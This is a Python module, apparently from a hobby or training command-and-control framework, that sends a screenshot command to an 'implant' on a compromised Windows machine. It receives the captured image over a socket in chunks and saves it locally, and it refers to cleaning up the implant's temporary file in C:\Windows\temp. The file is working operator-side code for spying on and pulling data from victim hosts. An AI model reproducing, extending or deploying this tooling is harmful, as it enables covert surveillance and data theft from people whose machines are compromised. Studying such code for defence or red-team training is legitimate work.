# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with screenshot functionality 

SUCCESS = 1
FAILURE = 0

# Command value
SCREENSHOT = 5


'''
Description:
    Prints screenshot usage for user 
Params:
    N/A
Returns:
    SUCCESS or FAILURE 
'''
def printScreenshotHelp():
    print("""Required params: \n
                -filepath - Path where we would like to write our screenshot to locally \n""")
    return SUCCESS


'''
Description:
    Performs screenshot functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filePath - local path to write our screenshot to 
Returns:
    SUCCESS or FAILURE 
'''
def screenshot(sock, filePath):
    try:
        # First tell our implant we want a screenshot
        print("Sending command...")
        sock.send(bytes(str(SCREENSHOT), "utf-8") + b'\x00')

        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        # We succeeded so get the file
        if (data == "SUCCESS"):

            # Get our screenshot file 
            print("Successful screenshot! Getting file size...")

            # Only sent a DWORD worth of data here so make sure our socket doesn't start accidentally reading our file bytes...
            data = sock.recv(4) 

            fileSize = int.from_bytes(data, 'little')

            print("File is %i bytes; Receiving data... " % fileSize)
            
            data = b''
            dataRead = 0

            # Sockets are sometimes annoying and weird (and fragile)
            while(dataRead < fileSize):
                # Either adding 1024 is going to keep us under our file size or...
                if (dataRead + 1024 <= fileSize):
                    sockData = sock.recv(1024)
                    data += sockData
                # Grabing 1024 will be too much so just grab the difference
                else:
                    dataToRead = fileSize - dataRead
                    sockData = sock.recv(dataToRead)
                    data += sockData
                dataRead = len(data)

            with open(filePath, "wb") as outputfile:
                    outputfile.write(data)
                    outputfile.close()

            print("Successfully wrote file to disk... awaiting implant reponse code...")

            data = sock.recv(1024)
            data = data.strip()
            data = data.decode('utf-8')

            if (data == 'SUCCESS'):
                print("Successful screenshot!\n")

            else:
                 print("Implant failed to delete file off target! Check C:\\Windows\\temp and ensure to delete that...")
                 return FAILURE

        else:
            print("Implant returned FAILURE!\n")
            return FAILURE


    except Exception as e:
        print("ERROR: Could not send screenshot to implant: ", e)
        return FAILURE
    
    return SUCCESS